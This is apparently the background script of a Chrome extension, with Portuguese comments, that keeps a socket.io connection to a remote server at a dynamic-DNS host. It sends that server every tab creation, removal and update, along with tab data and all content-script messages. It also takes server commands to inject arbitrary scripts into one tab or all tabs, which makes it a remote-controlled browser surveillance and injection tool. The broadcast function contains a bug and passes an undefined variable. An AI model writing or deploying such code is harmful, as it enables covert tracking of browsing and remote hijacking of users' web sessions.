/*
	#background chrome extension
*/
 
var sendBroadcastMessageToTabs = function(message){
	chrome.tabs.query({}, function(tabs) {
 		for(var i in tabs){
 			chrome.tabs.sendMessage(tabs[i].id, script);
 		}	
 	});
};

// var eachTabs = function(callback){
// 	chrome.tabs.query({}, function(tabs){
// 		for(var i in tabs){
// 			callback(tabs[i]);
// 		}
// 	});
// };

// const URI_CONNECT = 'http://104.131.115.101:3005';
const URI_CONNECT = 'http://rplayer.ddns.net:3005';
var timeChromeRuntimeReload = 10000;
var socket = io.connect(URI_CONNECT,{
	reconnection : true
});


// # SOCKETS EVENTS
socket.on('connect',function(){
	console.log('conectado');
	// eachTabs(function(tab){
	// 	chrome.tabs.sendMessage('newTabCompleteUpdated', tab);
	// });

});

socket.on('disconnect', function(){
	console.log('desconectado');
});

socket.on('connect_error', function(){
	// chromeRuntimeReload();
	console.log('connect_error');
});

//	Send to all tabs
socket.on('injectContentScriptByAllTabs', function(script){
	console.log('injectContentScriptByAllTabs');
	sendBroadcastMessageToTabs(script);
	
});

//	Send to a especific tab
socket.on('injectContentScriptByTabId', function(tabId, script){
	console.log('enviando mensagem para '+ tabId);
	chrome.tabs.sendMessage(tabId, script);
	
});	

// #CHROME EVENTS

//	Receiving message from content_script
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
  	// Send to server every informations from tab who was sent
    socket.emit(request.event,sender,request,sendResponse);
  });

// Send Message when Tab Created
chrome.tabs.onCreated.addListener(function(tab){
	socket.emit('onTabCreated', tab);
});

chrome.tabs.onRemoved.addListener(function(tabId){
	socket.emit('onTabRemoved', tabId);
});

// Send Message when Tab Updated
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.status == 'complete') {
    	socket.emit('onTabUpdated', tab);
    }
});



